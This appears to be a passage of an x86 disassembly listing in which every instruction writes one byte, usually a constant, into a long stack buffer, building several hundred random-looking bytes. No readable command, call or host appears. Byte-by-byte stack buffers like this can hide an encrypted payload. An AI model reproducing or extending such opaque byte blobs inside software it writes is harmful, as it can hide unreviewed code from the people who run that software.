  405591:	c6 85 08 ea ff ff 80 	mov    BYTE PTR [ebp-0x15f8],0x80
  405598:	c6 85 09 ea ff ff 90 	mov    BYTE PTR [ebp-0x15f7],0x90
  40559f:	88 9d 0a ea ff ff    	mov    BYTE PTR [ebp-0x15f6],bl
  4055a5:	c6 85 0b ea ff ff 72 	mov    BYTE PTR [ebp-0x15f5],0x72
  4055ac:	c6 85 0c ea ff ff 17 	mov    BYTE PTR [ebp-0x15f4],0x17
  4055b3:	c6 85 0d ea ff ff d8 	mov    BYTE PTR [ebp-0x15f3],0xd8
  4055ba:	c6 85 0e ea ff ff d4 	mov    BYTE PTR [ebp-0x15f2],0xd4
  4055c1:	c6 85 0f ea ff ff 74 	mov    BYTE PTR [ebp-0x15f1],0x74
  4055c8:	c6 85 10 ea ff ff 12 	mov    BYTE PTR [ebp-0x15f0],0x12
  4055cf:	c6 85 11 ea ff ff 18 	mov    BYTE PTR [ebp-0x15ef],0x18
  4055d6:	c6 85 12 ea ff ff d4 	mov    BYTE PTR [ebp-0x15ee],0xd4
  4055dd:	c6 85 13 ea ff ff 44 	mov    BYTE PTR [ebp-0x15ed],0x44
  4055e4:	c6 85 14 ea ff ff 1e 	mov    BYTE PTR [ebp-0x15ec],0x1e
  4055eb:	c6 85 15 ea ff ff 18 	mov    BYTE PTR [ebp-0x15eb],0x18
  4055f2:	c6 85 16 ea ff ff b4 	mov    BYTE PTR [ebp-0x15ea],0xb4
  4055f9:	c6 85 17 ea ff ff e4 	mov    BYTE PTR [ebp-0x15e9],0xe4
  405600:	c6 85 18 ea ff ff 41 	mov    BYTE PTR [ebp-0x15e8],0x41
  405607:	c6 85 19 ea ff ff 2a 	mov    BYTE PTR [ebp-0x15e7],0x2a
  40560e:	c6 85 1a ea ff ff 6b 	mov    BYTE PTR [ebp-0x15e6],0x6b
  405615:	c6 85 1b ea ff ff 70 	mov    BYTE PTR [ebp-0x15e5],0x70
  40561c:	88 9d 1c ea ff ff    	mov    BYTE PTR [ebp-0x15e4],bl
  405622:	c6 85 1d ea ff ff e0 	mov    BYTE PTR [ebp-0x15e3],0xe0
  405629:	c6 85 1e ea ff ff b3 	mov    BYTE PTR [ebp-0x15e2],0xb3
  405630:	c6 85 1f ea ff ff 66 	mov    BYTE PTR [ebp-0x15e1],0x66
  405637:	c6 85 20 ea ff ff 89 	mov    BYTE PTR [ebp-0x15e0],0x89
  40563e:	c6 85 21 ea ff ff 04 	mov    BYTE PTR [ebp-0x15df],0x4
  405645:	c6 85 22 ea ff ff 44 	mov    BYTE PTR [ebp-0x15de],0x44
  40564c:	c6 85 23 ea ff ff bc 	mov    BYTE PTR [ebp-0x15dd],0xbc
  405653:	c6 85 24 ea ff ff 33 	mov    BYTE PTR [ebp-0x15dc],0x33
  40565a:	c6 85 25 ea ff ff 3b 	mov    BYTE PTR [ebp-0x15db],0x3b
  405661:	c6 85 26 ea ff ff b1 	mov    BYTE PTR [ebp-0x15da],0xb1
  405668:	c6 85 27 ea ff ff 63 	mov    BYTE PTR [ebp-0x15d9],0x63
  40566f:	c6 85 28 ea ff ff 8b 	mov    BYTE PTR [ebp-0x15d8],0x8b
  405676:	88 9d 29 ea ff ff    	mov    BYTE PTR [ebp-0x15d7],bl
  40567c:	c6 85 2a ea ff ff 75 	mov    BYTE PTR [ebp-0x15d6],0x75
  405683:	c6 85 2b ea ff ff 76 	mov    BYTE PTR [ebp-0x15d5],0x76
  40568a:	c6 85 2c ea ff ff 49 	mov    BYTE PTR [ebp-0x15d4],0x49
  405691:	c6 85 2d ea ff ff a4 	mov    BYTE PTR [ebp-0x15d3],0xa4
  405698:	c6 85 2e ea ff ff 24 	mov    BYTE PTR [ebp-0x15d2],0x24
  40569f:	c6 85 2f ea ff ff 02 	mov    BYTE PTR [ebp-0x15d1],0x2
  4056a6:	c6 85 30 ea ff ff ba 	mov    BYTE PTR [ebp-0x15d0],0xba
  4056ad:	c6 85 31 ea ff ff 82 	mov    BYTE PTR [ebp-0x15cf],0x82
  4056b4:	c6 85 32 ea ff ff 20 	mov    BYTE PTR [ebp-0x15ce],0x20
  4056bb:	88 9d 33 ea ff ff    	mov    BYTE PTR [ebp-0x15cd],bl
  4056c1:	c6 85 34 ea ff ff 80 	mov    BYTE PTR [ebp-0x15cc],0x80
  4056c8:	c6 85 35 ea ff ff 88 	mov    BYTE PTR [ebp-0x15cb],0x88
  4056cf:	c6 85 36 ea ff ff ac 	mov    BYTE PTR [ebp-0x15ca],0xac
  4056d6:	c6 85 37 ea ff ff b4 	mov    BYTE PTR [ebp-0x15c9],0xb4
  4056dd:	c6 85 38 ea ff ff b4 	mov    BYTE PTR [ebp-0x15c8],0xb4
  4056e4:	c6 85 39 ea ff ff 68 	mov    BYTE PTR [ebp-0x15c7],0x68
  4056eb:	c6 85 3a ea ff ff 4c 	mov    BYTE PTR [ebp-0x15c6],0x4c
  4056f2:	c6 85 3b ea ff ff 74 	mov    BYTE PTR [ebp-0x15c5],0x74
  4056f9:	c6 85 3c ea ff ff 75 	mov    BYTE PTR [ebp-0x15c4],0x75
  405700:	c6 85 3d ea ff ff 99 	mov    BYTE PTR [ebp-0x15c3],0x99
  405707:	c6 85 3e ea ff ff cc 	mov    BYTE PTR [ebp-0x15c2],0xcc
  40570e:	c6 85 3f ea ff ff d0 	mov    BYTE PTR [ebp-0x15c1],0xd0
  405715:	88 9d 40 ea ff ff    	mov    BYTE PTR [ebp-0x15c0],bl
  40571b:	88 9d 41 ea ff ff    	mov    BYTE PTR [ebp-0x15bf],bl
  405721:	c6 85 42 ea ff ff 36 	mov    BYTE PTR [ebp-0x15be],0x36
  405728:	c6 85 43 ea ff ff 46 	mov    BYTE PTR [ebp-0x15bd],0x46
  40572f:	c6 85 44 ea ff ff 89 	mov    BYTE PTR [ebp-0x15bc],0x89
  405736:	c6 85 45 ea ff ff 94 	mov    BYTE PTR [ebp-0x15bb],0x94
  40573d:	c6 85 46 ea ff ff 84 	mov    BYTE PTR [ebp-0x15ba],0x84
  405744:	c6 85 47 ea ff ff 58 	mov    BYTE PTR [ebp-0x15b9],0x58
  40574b:	c6 85 48 ea ff ff d7 	mov    BYTE PTR [ebp-0x15b8],0xd7
  405752:	c6 85 49 ea ff ff a9 	mov    BYTE PTR [ebp-0x15b7],0xa9
  405759:	c6 85 4a ea ff ff dc 	mov    BYTE PTR [ebp-0x15b6],0xdc
  405760:	c6 85 4b ea ff ff f4 	mov    BYTE PTR [ebp-0x15b5],0xf4
  405767:	c6 85 4c ea ff ff 54 	mov    BYTE PTR [ebp-0x15b4],0x54
  40576e:	c6 85 4d ea ff ff 36 	mov    BYTE PTR [ebp-0x15b3],0x36
  405775:	c6 85 4e ea ff ff e4 	mov    BYTE PTR [ebp-0x15b2],0xe4
  40577c:	c6 85 4f ea ff ff 64 	mov    BYTE PTR [ebp-0x15b1],0x64
  405783:	c6 85 50 ea ff ff 30 	mov    BYTE PTR [ebp-0x15b0],0x30
  40578a:	c6 85 51 ea ff ff 27 	mov    BYTE PTR [ebp-0x15af],0x27
  405791:	c6 85 52 ea ff ff 08 	mov    BYTE PTR [ebp-0x15ae],0x8
  405798:	c6 85 53 ea ff ff a4 	mov    BYTE PTR [ebp-0x15ad],0xa4
  40579f:	c6 85 54 ea ff ff 64 	mov    BYTE PTR [ebp-0x15ac],0x64
  4057a6:	c6 85 55 ea ff ff c1 	mov    BYTE PTR [ebp-0x15ab],0xc1
  4057ad:	c6 85 56 ea ff ff a6 	mov    BYTE PTR [ebp-0x15aa],0xa6
  4057b4:	c6 85 57 ea ff ff 14 	mov    BYTE PTR [ebp-0x15a9],0x14
  4057bb:	c6 85 58 ea ff ff 24 	mov    BYTE PTR [ebp-0x15a8],0x24
  4057c2:	c6 85 59 ea ff ff a2 	mov    BYTE PTR [ebp-0x15a7],0xa2
  4057c9:	c6 85 5a ea ff ff 94 	mov    BYTE PTR [ebp-0x15a6],0x94
  4057d0:	c6 85 5b ea ff ff 66 	mov    BYTE PTR [ebp-0x15a5],0x66
  4057d7:	c6 85 5c ea ff ff 84 	mov    BYTE PTR [ebp-0x15a4],0x84
  4057de:	c6 85 5d ea ff ff 54 	mov    BYTE PTR [ebp-0x15a3],0x54
  4057e5:	c6 85 5e ea ff ff 13 	mov    BYTE PTR [ebp-0x15a2],0x13
  4057ec:	c6 85 5f ea ff ff 80 	mov    BYTE PTR [ebp-0x15a1],0x80
  4057f3:	c6 85 60 ea ff ff c6 	mov    BYTE PTR [ebp-0x15a0],0xc6
  4057fa:	c6 85 61 ea ff ff 74 	mov    BYTE PTR [ebp-0x159f],0x74
  405801:	c6 85 62 ea ff ff e4 	mov    BYTE PTR [ebp-0x159e],0xe4
  405808:	c6 85 63 ea ff ff 34 	mov    BYTE PTR [ebp-0x159d],0x34
  40580f:	c6 85 64 ea ff ff 32 	mov    BYTE PTR [ebp-0x159c],0x32
  405816:	c6 85 65 ea ff ff 26 	mov    BYTE PTR [ebp-0x159b],0x26
  40581d:	c6 85 66 ea ff ff 44 	mov    BYTE PTR [ebp-0x159a],0x44
  405824:	c6 85 67 ea ff ff 04 	mov    BYTE PTR [ebp-0x1599],0x4
  40582b:	c6 85 68 ea ff ff 35 	mov    BYTE PTR [ebp-0x1598],0x35
  405832:	c6 85 69 ea ff ff af 	mov    BYTE PTR [ebp-0x1597],0xaf
  405839:	c6 85 6a ea ff ff 66 	mov    BYTE PTR [ebp-0x1596],0x66
  405840:	c6 85 6b ea ff ff 84 	mov    BYTE PTR [ebp-0x1595],0x84
  405847:	c6 85 6c ea ff ff e4 	mov    BYTE PTR [ebp-0x1594],0xe4
  40584e:	c6 85 6d ea ff ff 76 	mov    BYTE PTR [ebp-0x1593],0x76
  405855:	c6 85 6e ea ff ff e3 	mov    BYTE PTR [ebp-0x1592],0xe3
  40585c:	c6 85 6f ea ff ff 46 	mov    BYTE PTR [ebp-0x1591],0x46
  405863:	c6 85 70 ea ff ff 44 	mov    BYTE PTR [ebp-0x1590],0x44
  40586a:	c6 85 71 ea ff ff a4 	mov    BYTE PTR [ebp-0x158f],0xa4
  405871:	c6 85 72 ea ff ff b7 	mov    BYTE PTR [ebp-0x158e],0xb7
  405878:	c6 85 73 ea ff ff 91 	mov    BYTE PTR [ebp-0x158d],0x91
  40587f:	c6 85 74 ea ff ff 86 	mov    BYTE PTR [ebp-0x158c],0x86
  405886:	c6 85 75 ea ff ff 24 	mov    BYTE PTR [ebp-0x158b],0x24
  40588d:	c6 85 76 ea ff ff a4 	mov    BYTE PTR [ebp-0x158a],0xa4
  405894:	c6 85 77 ea ff ff 48 	mov    BYTE PTR [ebp-0x1589],0x48
  40589b:	c6 85 78 ea ff ff e4 	mov    BYTE PTR [ebp-0x1588],0xe4
  4058a2:	c6 85 79 ea ff ff 06 	mov    BYTE PTR [ebp-0x1587],0x6
  4058a9:	c6 85 7a ea ff ff 04 	mov    BYTE PTR [ebp-0x1586],0x4
  4058b0:	c6 85 7b ea ff ff 94 	mov    BYTE PTR [ebp-0x1585],0x94
  4058b7:	c6 85 7c ea ff ff 39 	mov    BYTE PTR [ebp-0x1584],0x39
  4058be:	c6 85 7d ea ff ff 64 	mov    BYTE PTR [ebp-0x1583],0x64
  4058c5:	c6 85 7e ea ff ff 66 	mov    BYTE PTR [ebp-0x1582],0x66
  4058cc:	c6 85 7f ea ff ff 74 	mov    BYTE PTR [ebp-0x1581],0x74
  4058d3:	c6 85 80 ea ff ff 24 	mov    BYTE PTR [ebp-0x1580],0x24
  4058da:	c6 85 81 ea ff ff 3a 	mov    BYTE PTR [ebp-0x157f],0x3a
  4058e1:	c6 85 82 ea ff ff 72 	mov    BYTE PTR [ebp-0x157e],0x72
  4058e8:	c6 85 83 ea ff ff 58 	mov    BYTE PTR [ebp-0x157d],0x58
  4058ef:	c6 85 84 ea ff ff 44 	mov    BYTE PTR [ebp-0x157c],0x44
  4058f6:	c6 85 85 ea ff ff 94 	mov    BYTE PTR [ebp-0x157b],0x94
  4058fd:	c6 85 86 ea ff ff 7b 	mov    BYTE PTR [ebp-0x157a],0x7b
  405904:	c6 85 87 ea ff ff 48 	mov    BYTE PTR [ebp-0x1579],0x48
  40590b:	c6 85 88 ea ff ff 5c 	mov    BYTE PTR [ebp-0x1578],0x5c
  405912:	c6 85 89 ea ff ff c4 	mov    BYTE PTR [ebp-0x1577],0xc4
  405919:	c6 85 8a ea ff ff fe 	mov    BYTE PTR [ebp-0x1576],0xfe
  405920:	c6 85 8b ea ff ff b6 	mov    BYTE PTR [ebp-0x1575],0xb6
  405927:	c6 85 8c ea ff ff c4 	mov    BYTE PTR [ebp-0x1574],0xc4
  40592e:	c6 85 8d ea ff ff d4 	mov    BYTE PTR [ebp-0x1573],0xd4
  405935:	c6 85 8e ea ff ff 98 	mov    BYTE PTR [ebp-0x1572],0x98
  40593c:	c6 85 8f ea ff ff a4 	mov    BYTE PTR [ebp-0x1571],0xa4
  405943:	c6 85 90 ea ff ff 88 	mov    BYTE PTR [ebp-0x1570],0x88
  40594a:	c6 85 91 ea ff ff f4 	mov    BYTE PTR [ebp-0x156f],0xf4
  405951:	c6 85 92 ea ff ff 24 	mov    BYTE PTR [ebp-0x156e],0x24
  405958:	c6 85 93 ea ff ff a9 	mov    BYTE PTR [ebp-0x156d],0xa9
  40595f:	c6 85 94 ea ff ff 48 	mov    BYTE PTR [ebp-0x156c],0x48
  405966:	c6 85 95 ea ff ff ac 	mov    BYTE PTR [ebp-0x156b],0xac
  40596d:	c6 85 96 ea ff ff c4 	mov    BYTE PTR [ebp-0x156a],0xc4
  405974:	c6 85 97 ea ff ff da 	mov    BYTE PTR [ebp-0x1569],0xda
  40597b:	c6 85 98 ea ff ff 88 	mov    BYTE PTR [ebp-0x1568],0x88
  405982:	c6 85 99 ea ff ff 84 	mov    BYTE PTR [ebp-0x1567],0x84
  405989:	c6 85 9a ea ff ff a4 	mov    BYTE PTR [ebp-0x1566],0xa4
  405990:	c6 85 9b ea ff ff 5b 	mov    BYTE PTR [ebp-0x1565],0x5b
  405997:	c6 85 9c ea ff ff 06 	mov    BYTE PTR [ebp-0x1564],0x6
  40599e:	c6 85 9d ea ff ff a4 	mov    BYTE PTR [ebp-0x1563],0xa4
  4059a5:	c6 85 9e ea ff ff 84 	mov    BYTE PTR [ebp-0x1562],0x84
  4059ac:	c6 85 9f ea ff ff dc 	mov    BYTE PTR [ebp-0x1561],0xdc
  4059b3:	c6 85 a0 ea ff ff 74 	mov    BYTE PTR [ebp-0x1560],0x74
  4059ba:	c6 85 a1 ea ff ff 48 	mov    BYTE PTR [ebp-0x155f],0x48
  4059c1:	c6 85 a2 ea ff ff c4 	mov    BYTE PTR [ebp-0x155e],0xc4
  4059c8:	c6 85 a3 ea ff ff 34 	mov    BYTE PTR [ebp-0x155d],0x34
  4059cf:	c6 85 a4 ea ff ff 1d 	mov    BYTE PTR [ebp-0x155c],0x1d
  4059d6:	c6 85 a5 ea ff ff 16 	mov    BYTE PTR [ebp-0x155b],0x16
  4059dd:	c6 85 a6 ea ff ff 64 	mov    BYTE PTR [ebp-0x155a],0x64
  4059e4:	c6 85 a7 ea ff ff a4 	mov    BYTE PTR [ebp-0x1559],0xa4
  4059eb:	c6 85 a8 ea ff ff 1e 	mov    BYTE PTR [ebp-0x1558],0x1e
  4059f2:	c6 85 a9 ea ff ff b6 	mov    BYTE PTR [ebp-0x1557],0xb6
  4059f9:	c6 85 aa ea ff ff e6 	mov    BYTE PTR [ebp-0x1556],0xe6
  405a00:	c6 85 ab ea ff ff a4 	mov    BYTE PTR [ebp-0x1555],0xa4
  405a07:	c6 85 ac ea ff ff a4 	mov    BYTE PTR [ebp-0x1554],0xa4
  405a0e:	c6 85 ad ea ff ff af 	mov    BYTE PTR [ebp-0x1553],0xaf
  405a15:	c6 85 ae ea ff ff e9 	mov    BYTE PTR [ebp-0x1552],0xe9
  405a1c:	c6 85 af ea ff ff d8 	mov    BYTE PTR [ebp-0x1551],0xd8
  405a23:	c6 85 b0 ea ff ff 4c 	mov    BYTE PTR [ebp-0x1550],0x4c
  405a2a:	c6 85 b1 ea ff ff 14 	mov    BYTE PTR [ebp-0x154f],0x14
  405a31:	c6 85 b2 ea ff ff a0 	mov    BYTE PTR [ebp-0x154e],0xa0
  405a38:	c6 85 b3 ea ff ff 58 	mov    BYTE PTR [ebp-0x154d],0x58
  405a3f:	c6 85 b4 ea ff ff 44 	mov    BYTE PTR [ebp-0x154c],0x44
  405a46:	c6 85 b5 ea ff ff 54 	mov    BYTE PTR [ebp-0x154b],0x54
  405a4d:	c6 85 b6 ea ff ff 41 	mov    BYTE PTR [ebp-0x154a],0x41
  405a54:	c6 85 b7 ea ff ff 18 	mov    BYTE PTR [ebp-0x1549],0x18
  405a5b:	c6 85 b8 ea ff ff dc 	mov    BYTE PTR [ebp-0x1548],0xdc
  405a62:	c6 85 b9 ea ff ff 34 	mov    BYTE PTR [ebp-0x1547],0x34
  405a69:	c6 85 ba ea ff ff e3 	mov    BYTE PTR [ebp-0x1546],0xe3
  405a70:	c6 85 bb ea ff ff d6 	mov    BYTE PTR [ebp-0x1545],0xd6
  405a77:	c6 85 bc ea ff ff c4 	mov    BYTE PTR [ebp-0x1544],0xc4
  405a7e:	c6 85 bd ea ff ff f4 	mov    BYTE PTR [ebp-0x1543],0xf4
  405a85:	c6 85 be ea ff ff 24 	mov    BYTE PTR [ebp-0x1542],0x24
  405a8c:	c6 85 bf ea ff ff 9d 	mov    BYTE PTR [ebp-0x1541],0x9d
  405a93:	c6 85 c0 ea ff ff c6 	mov    BYTE PTR [ebp-0x1540],0xc6
  405a9a:	c6 85 c1 ea ff ff 44 	mov    BYTE PTR [ebp-0x153f],0x44
  405aa1:	c6 85 c2 ea ff ff 24 	mov    BYTE PTR [ebp-0x153e],0x24
  405aa8:	c6 85 c3 ea ff ff 75 	mov    BYTE PTR [ebp-0x153d],0x75
  405aaf:	c6 85 c4 ea ff ff af 	mov    BYTE PTR [ebp-0x153c],0xaf
  405ab6:	c6 85 c5 ea ff ff b6 	mov    BYTE PTR [ebp-0x153b],0xb6
  405abd:	c6 85 c6 ea ff ff 44 	mov    BYTE PTR [ebp-0x153a],0x44
  405ac4:	c6 85 c7 ea ff ff 54 	mov    BYTE PTR [ebp-0x1539],0x54
  405acb:	c6 85 c8 ea ff ff 26 	mov    BYTE PTR [ebp-0x1538],0x26
  405ad2:	c6 85 c9 ea ff ff b6 	mov    BYTE PTR [ebp-0x1537],0xb6
  405ad9:	c6 85 ca ea ff ff 08 	mov    BYTE PTR [ebp-0x1536],0x8
  405ae0:	c6 85 cb ea ff ff 74 	mov    BYTE PTR [ebp-0x1535],0x74
  405ae7:	c6 85 cc ea ff ff 64 	mov    BYTE PTR [ebp-0x1534],0x64
  405aee:	c6 85 cd ea ff ff 57 	mov    BYTE PTR [ebp-0x1533],0x57
  405af5:	c6 85 ce ea ff ff a6 	mov    BYTE PTR [ebp-0x1532],0xa6
  405afc:	c6 85 cf ea ff ff 34 	mov    BYTE PTR [ebp-0x1531],0x34
  405b03:	c6 85 d0 ea ff ff 24 	mov    BYTE PTR [ebp-0x1530],0x24
  405b0a:	c6 85 d1 ea ff ff 68 	mov    BYTE PTR [ebp-0x152f],0x68
  405b11:	c6 85 d2 ea ff ff a6 	mov    BYTE PTR [ebp-0x152e],0xa6
  405b18:	c6 85 d3 ea ff ff 56 	mov    BYTE PTR [ebp-0x152d],0x56
  405b1f:	c6 85 d4 ea ff ff 44 	mov    BYTE PTR [ebp-0x152c],0x44
  405b26:	c6 85 d5 ea ff ff 24 	mov    BYTE PTR [ebp-0x152b],0x24
  405b2d:	c6 85 d6 ea ff ff 09 	mov    BYTE PTR [ebp-0x152a],0x9
  405b34:	c6 85 d7 ea ff ff 49 	mov    BYTE PTR [ebp-0x1529],0x49
  405b3b:	c6 85 d8 ea ff ff 88 	mov    BYTE PTR [ebp-0x1528],0x88
  405b42:	c6 85 d9 ea ff ff 0c 	mov    BYTE PTR [ebp-0x1527],0xc
  405b49:	c6 85 da ea ff ff e4 	mov    BYTE PTR [ebp-0x1526],0xe4
  405b50:	c6 85 db ea ff ff 8a 	mov    BYTE PTR [ebp-0x1525],0x8a
  405b57:	c6 85 dc ea ff ff 08 	mov    BYTE PTR [ebp-0x1524],0x8
  405b5e:	c6 85 dd ea ff ff f4 	mov    BYTE PTR [ebp-0x1523],0xf4
  405b65:	c6 85 de ea ff ff 04 	mov    BYTE PTR [ebp-0x1522],0x4
  405b6c:	c6 85 df ea ff ff ab 	mov    BYTE PTR [ebp-0x1521],0xab
  405b73:	c6 85 e0 ea ff ff c6 	mov    BYTE PTR [ebp-0x1520],0xc6
  405b7a:	c6 85 e1 ea ff ff 04 	mov    BYTE PTR [ebp-0x151f],0x4
  405b81:	c6 85 e2 ea ff ff c4 	mov    BYTE PTR [ebp-0x151e],0xc4
  405b88:	c6 85 e3 ea ff ff bc 	mov    BYTE PTR [ebp-0x151d],0xbc
  405b8f:	c6 85 e4 ea ff ff 45 	mov    BYTE PTR [ebp-0x151c],0x45
  405b96:	c6 85 e5 ea ff ff 76 	mov    BYTE PTR [ebp-0x151b],0x76
  405b9d:	c6 85 e6 ea ff ff 24 	mov    BYTE PTR [ebp-0x151a],0x24
  405ba4:	c6 85 e7 ea ff ff 24 	mov    BYTE PTR [ebp-0x1519],0x24
  405bab:	c6 85 e8 ea ff ff 2d 	mov    BYTE PTR [ebp-0x1518],0x2d
  405bb2:	c6 85 e9 ea ff ff 28 	mov    BYTE PTR [ebp-0x1517],0x28
  405bb9:	c6 85 ea ea ff ff 48 	mov    BYTE PTR [ebp-0x1516],0x48
  405bc0:	c6 85 eb ea ff ff 4c 	mov    BYTE PTR [ebp-0x1515],0x4c
  405bc7:	c6 85 ec ea ff ff a4 	mov    BYTE PTR [ebp-0x1514],0xa4
  405bce:	c6 85 ed ea ff ff 7f 	mov    BYTE PTR [ebp-0x1513],0x7f
  405bd5:	c6 85 ee ea ff ff 46 	mov    BYTE PTR [ebp-0x1512],0x46
  405bdc:	c6 85 ef ea ff ff d4 	mov    BYTE PTR [ebp-0x1511],0xd4
  405be3:	c6 85 f0 ea ff ff 24 	mov    BYTE PTR [ebp-0x1510],0x24
  405bea:	c6 85 f1 ea ff ff 80 	mov    BYTE PTR [ebp-0x150f],0x80
  405bf1:	c6 85 f2 ea ff ff 73 	mov    BYTE PTR [ebp-0x150e],0x73
  405bf8:	c6 85 f3 ea ff ff d8 	mov    BYTE PTR [ebp-0x150d],0xd8
  405bff:	c6 85 f4 ea ff ff 8c 	mov    BYTE PTR [ebp-0x150c],0x8c
  405c06:	c6 85 f5 ea ff ff 54 	mov    BYTE PTR [ebp-0x150b],0x54
  405c0d:	c6 85 f6 ea ff ff b1 	mov    BYTE PTR [ebp-0x150a],0xb1
  405c14:	c6 85 f7 ea ff ff 78 	mov    BYTE PTR [ebp-0x1509],0x78
  405c1b:	c6 85 f8 ea ff ff c4 	mov    BYTE PTR [ebp-0x1508],0xc4
  405c22:	c6 85 f9 ea ff ff 64 	mov    BYTE PTR [ebp-0x1507],0x64
  405c29:	c6 85 fa ea ff ff 92 	mov    BYTE PTR [ebp-0x1506],0x92
  405c30:	c6 85 fb ea ff ff 98 	mov    BYTE PTR [ebp-0x1505],0x98
  405c37:	c6 85 fc ea ff ff 44 	mov    BYTE PTR [ebp-0x1504],0x44
  405c3e:	c6 85 fd ea ff ff c4 	mov    BYTE PTR [ebp-0x1503],0xc4
  405c45:	c6 85 fe ea ff ff 13 	mov    BYTE PTR [ebp-0x1502],0x13
  405c4c:	c6 85 ff ea ff ff c6 	mov    BYTE PTR [ebp-0x1501],0xc6
  405c53:	c6 85 00 eb ff ff 44 	mov    BYTE PTR [ebp-0x1500],0x44
  405c5a:	c6 85 01 eb ff ff 24 	mov    BYTE PTR [ebp-0x14ff],0x24
  405c61:	c6 85 02 eb ff ff f4 	mov    BYTE PTR [ebp-0x14fe],0xf4
  405c68:	88 9d 03 eb ff ff    	mov    BYTE PTR [ebp-0x14fd],bl
  405c6e:	c6 85 04 eb ff ff 88 	mov    BYTE PTR [ebp-0x14fc],0x88
  405c75:	c6 85 05 eb ff ff ac 	mov    BYTE PTR [ebp-0x14fb],0xac
  405c7c:	c6 85 06 eb ff ff 44 	mov    BYTE PTR [ebp-0x14fa],0x44
  405c83:	c6 85 07 eb ff ff 25 	mov    BYTE PTR [ebp-0x14f9],0x25
  405c8a:	c6 85 08 eb ff ff 46 	mov    BYTE PTR [ebp-0x14f8],0x46
  405c91:	c6 85 09 eb ff ff 84 	mov    BYTE PTR [ebp-0x14f7],0x84
  405c98:	c6 85 0a eb ff ff a4 	mov    BYTE PTR [ebp-0x14f6],0xa4
  405c9f:	c6 85 0b eb ff ff a0 	mov    BYTE PTR [ebp-0x14f5],0xa0
  405ca6:	c6 85 0c eb ff ff c7 	mov    BYTE PTR [ebp-0x14f4],0xc7
  405cad:	c6 85 0d eb ff ff 48 	mov    BYTE PTR [ebp-0x14f3],0x48
  405cb4:	c6 85 0e eb ff ff 24 	mov    BYTE PTR [ebp-0x14f2],0x24
  405cbb:	c6 85 0f eb ff ff 04 	mov    BYTE PTR [ebp-0x14f1],0x4
  405cc2:	c6 85 10 eb ff ff 41 	mov    BYTE PTR [ebp-0x14f0],0x41
  405cc9:	c6 85 11 eb ff ff 26 	mov    BYTE PTR [ebp-0x14ef],0x26
  405cd0:	c6 85 12 eb ff ff 24 	mov    BYTE PTR [ebp-0x14ee],0x24
  405cd7:	c6 85 13 eb ff ff 04 	mov    BYTE PTR [ebp-0x14ed],0x4
  405cde:	c6 85 14 eb ff ff 42 	mov    BYTE PTR [ebp-0x14ec],0x42
  405ce5:	c6 85 15 eb ff ff 54 	mov    BYTE PTR [ebp-0x14eb],0x54
  405cec:	c6 85 16 eb ff ff 26 	mov    BYTE PTR [ebp-0x14ea],0x26
  405cf3:	c6 85 17 eb ff ff e4 	mov    BYTE PTR [ebp-0x14e9],0xe4
  405cfa:	c6 85 18 eb ff ff a4 	mov    BYTE PTR [ebp-0x14e8],0xa4
  405d01:	c6 85 19 eb ff ff 53 	mov    BYTE PTR [ebp-0x14e7],0x53
  405d08:	c6 85 1a eb ff ff 0d 	mov    BYTE PTR [ebp-0x14e6],0xd
  405d0f:	c6 85 1b eb ff ff 76 	mov    BYTE PTR [ebp-0x14e5],0x76
  405d16:	c6 85 1c eb ff ff 44 	mov    BYTE PTR [ebp-0x14e4],0x44
  405d1d:	c6 85 1d eb ff ff 64 	mov    BYTE PTR [ebp-0x14e3],0x64
  405d24:	c6 85 1e eb ff ff c4 	mov    BYTE PTR [ebp-0x14e2],0xc4
  405d2b:	c6 85 1f eb ff ff df 	mov    BYTE PTR [ebp-0x14e1],0xdf
  405d32:	c6 85 20 eb ff ff c6 	mov    BYTE PTR [ebp-0x14e0],0xc6
  405d39:	c6 85 21 eb ff ff 84 	mov    BYTE PTR [ebp-0x14df],0x84
  405d40:	c6 85 22 eb ff ff c4 	mov    BYTE PTR [ebp-0x14de],0xc4
  405d47:	c6 85 23 eb ff ff 55 	mov    BYTE PTR [ebp-0x14dd],0x55
  405d4e:	c6 85 24 eb ff ff 24 	mov    BYTE PTR [ebp-0x14dc],0x24
  405d55:	c6 85 25 eb ff ff 96 	mov    BYTE PTR [ebp-0x14db],0x96
  405d5c:	c6 85 26 eb ff ff 24 	mov    BYTE PTR [ebp-0x14da],0x24
  405d63:	c6 85 27 eb ff ff a4 	mov    BYTE PTR [ebp-0x14d9],0xa4
  405d6a:	c6 85 28 eb ff ff c6 	mov    BYTE PTR [ebp-0x14d8],0xc6
  405d71:	c6 85 29 eb ff ff 25 	mov    BYTE PTR [ebp-0x14d7],0x25
  405d78:	c6 85 2a eb ff ff a8 	mov    BYTE PTR [ebp-0x14d6],0xa8
  405d7f:	c6 85 2b eb ff ff bc 	mov    BYTE PTR [ebp-0x14d5],0xbc
  405d86:	c6 85 2c eb ff ff a4 	mov    BYTE PTR [ebp-0x14d4],0xa4
  405d8d:	c6 85 2d eb ff ff 97 	mov    BYTE PTR [ebp-0x14d3],0x97
  405d94:	c6 85 2e eb ff ff 28 	mov    BYTE PTR [ebp-0x14d2],0x28
  405d9b:	c6 85 2f eb ff ff 34 	mov    BYTE PTR [ebp-0x14d1],0x34
  405da2:	c6 85 30 eb ff ff 24 	mov    BYTE PTR [ebp-0x14d0],0x24
  405da9:	c6 85 31 eb ff ff 58 	mov    BYTE PTR [ebp-0x14cf],0x58
  405db0:	c6 85 32 eb ff ff 46 	mov    BYTE PTR [ebp-0x14ce],0x46
  405db7:	c6 85 33 eb ff ff d4 	mov    BYTE PTR [ebp-0x14cd],0xd4
  405dbe:	c6 85 34 eb ff ff 64 	mov    BYTE PTR [ebp-0x14cc],0x64
  405dc5:	c6 85 35 eb ff ff 79 	mov    BYTE PTR [ebp-0x14cb],0x79
  405dcc:	c6 85 36 eb ff ff c6 	mov    BYTE PTR [ebp-0x14ca],0xc6
  405dd3:	c6 85 37 eb ff ff f6 	mov    BYTE PTR [ebp-0x14c9],0xf6
  405dda:	c6 85 38 eb ff ff 44 	mov    BYTE PTR [ebp-0x14c8],0x44
  405de1:	c6 85 39 eb ff ff c4 	mov    BYTE PTR [ebp-0x14c7],0xc4
  405de8:	c6 85 3a eb ff ff 6a 	mov    BYTE PTR [ebp-0x14c6],0x6a
  405def:	c6 85 3b eb ff ff 19 	mov    BYTE PTR [ebp-0x14c5],0x19
  405df6:	c6 85 3c eb ff ff 08 	mov    BYTE PTR [ebp-0x14c4],0x8
  405dfd:	c6 85 3d eb ff ff 8c 	mov    BYTE PTR [ebp-0x14c3],0x8c
  405e04:	c6 85 3e eb ff ff c4 	mov    BYTE PTR [ebp-0x14c2],0xc4
